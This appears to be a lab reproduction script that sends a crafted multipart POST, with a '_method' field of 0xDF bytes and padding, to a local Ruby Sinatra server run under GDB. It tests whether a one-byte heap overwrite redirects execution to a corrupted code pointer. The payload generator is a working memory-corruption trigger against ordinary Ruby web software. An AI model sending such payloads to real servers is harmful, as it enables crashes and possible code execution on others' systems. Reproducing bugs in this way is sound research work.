#!/usr/bin/env bash
# Consumer falsifier for the C=112 one-byte write into the adjacent qword.
#
# Production classic Sinatra under jemalloc, wire-only multipart POST. GDB sets
# execute breakpoints on oldbt_bugreport and on oldbt_bugreport+0x13 (the
# corrupted code-pointer value observed at C=112), then drives one attack and
# one follow-up request. No debugger write, hook, marker or middleware is in
# the request path: the breakpoints only observe whether either target is
# executed. A safe-input arm is the control.
#
# Usage: bash lab/repro/ruby2shell-prod112-consumer.sh [attack|safe] [tag]
# Evidence: lab/build/evidence/prod112cons<TAG>.{gdb,out,body}
set -u
cd "$(dirname "$0")/../.." || exit 2
MODE="${1:-attack}"
TAG="${2:-prod112cons-$MODE}"
PORT=4682
EV=lab/build/evidence
mkdir -p "$EV"
BODY="$EV/$TAG.body"
OUT="$EV/$TAG.out"
LOG="$EV/$TAG.gdb"
GDBCMD="$EV/$TAG.gdbcmd"
RUBY=lab/build/plain/ruby-3.4.12-plain/bin/ruby
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
python3 - "$MODE" > "$BODY" <<'PY'
import sys
mode = sys.argv[1]
m = 112 - 65
if mode == 'attack':
    data = b'\xdf'*20 + b'a'*m + b'\xdf'
else:
    data = b'a'*(m+21)
sys.stdout.buffer.write(
    b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
    b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n' + data +
    b'\r\n--XB--\r\n')
PY
cat > "$GDBCMD" <<'GDB'
set pagination off
set breakpoint pending on
set confirm off
break oldbt_bugreport
commands
silent
printf "OLDBT_ENTRY_HIT\n"
continue
end
break *(oldbt_bugreport + 19)
commands
silent
printf "OLDBT_PLUS13_HIT\n"
continue
end
run
GDB
{
  echo "== $TAG mode=$MODE"
  RACK_ENV=production RUBY2SHELL_STOCK_PORT="$PORT" LD_PRELOAD=libjemalloc.so.2 \
    gdb -q -batch -x "$GDBCMD" --args \
    "$RUBY" lab/repro/ruby2shell-stock-baseline.ru > "$LOG" 2>&1 &
  GPID=$!
  READY=NO
  for _ in $(seq 1 300); do
    if curl -s -m 1 "http://127.0.0.1:$PORT/" >/dev/null 2>&1; then READY=YES; break; fi
    sleep 0.1
  done
  curl -s -m 20 -X POST "http://127.0.0.1:$PORT/not-a-route" \
    -H 'Content-Type: multipart/form-data; boundary=XB' \
    --data-binary "@$BODY" -w '\nTRIGGER_HTTP=%{http_code}\n'
  curl -s -m 5 "http://127.0.0.1:$PORT/" -w '\nALIVE_HTTP=%{http_code}\n'
  sleep 1
  kill "$GPID" 2>/dev/null || true
  wait "$GPID" 2>/dev/null || true
} > "$OUT" 2>&1
cat "$OUT"
printf 'entry-hits=%s plus13-hits=%s\n' \
  "$(grep -c OLDBT_ENTRY_HIT "$LOG" || true)" \
  "$(grep -c OLDBT_PLUS13_HIT "$LOG" || true)"
